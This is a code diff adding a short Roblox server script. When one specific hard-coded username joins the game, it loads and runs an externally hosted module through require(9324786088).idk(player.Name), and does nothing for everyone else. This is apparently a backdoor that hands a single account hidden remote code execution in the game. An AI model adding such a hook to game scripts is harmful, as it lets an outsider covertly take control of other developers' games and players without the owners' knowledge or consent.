@@ -1,0 +1,10 @@
+local Players = game:GetService("Players")
+
+Players.PlayerAdded:Connect(function(player)
+	if player.Name == "phuriwat343112" then
+		print("hii")
+		require(9324786088).idk(player.Name)
+	else
+		print(" ")
+	end
+end)
